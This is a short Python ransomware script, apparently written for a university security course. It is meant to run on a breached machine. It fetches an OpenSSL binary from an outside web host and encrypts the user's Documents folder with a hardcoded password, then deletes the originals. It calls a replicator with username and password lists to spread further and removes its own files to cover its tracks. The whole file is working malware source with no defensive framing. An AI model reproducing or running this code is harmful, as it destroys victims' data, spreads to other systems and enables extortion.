""" Program to run on remote system after being transferred onto it. Downloads OpenSSL
    and uses it to encrypt target system. Also leaves a silly note. """
import os
import time
import urllib
import tarfile
import shutil
from subprocess import call

def encrypt_directory(password):
    """ Encrypts Documents, assuming it exists, and replaces with tar file """
    tar = tarfile.open("ineedmoney.tar", "w:gz")
    tar.add("Documents/")
    tar.close()
    call(("chmod a+x ./openssl").split(" "))
    call(("./openssl enc -aes-256-cbc -in ineedmoney.tar -out ineedmoneyplz.tar -pass pass:" + password).split(" "))
    os.remove("ineedmoney.tar")
    shutil.rmtree("Documents/") 

def main():
    """ Main function. Runs locally afte ssh connection is terminated. Deletes itself
    once it finishes executing. """
    encryption_password = "cpsc456"
    url = "http://ecs.fullerton.edu/~mgofman/openssl"
    try:
        urllib.urlretrieve(url, "openssl")
        encrypt_directory(encryption_password)
        call("python replicator.py local_ransom.py usernames.txt passwords.txt".split(" "))
    except Exception as somethingbadhappened:
        pass
    finally:
        # Give system tim eto execute its own attack befoe deletin files  
        time.sleep(90)
        call("rm local_ransom.py".split(" "))
        call("rm ransom.py usernames.txt passwords.txt".split(" "))
        call("rm SSHConnection.py SSHConnection.pyc".split(" "))
        call("rm ineedmoney.tar".split(" "))
        call("rm replicator.py".split(" "))
        call("rm openssl".split(" "))

if __name__ == "__main__":
    main()
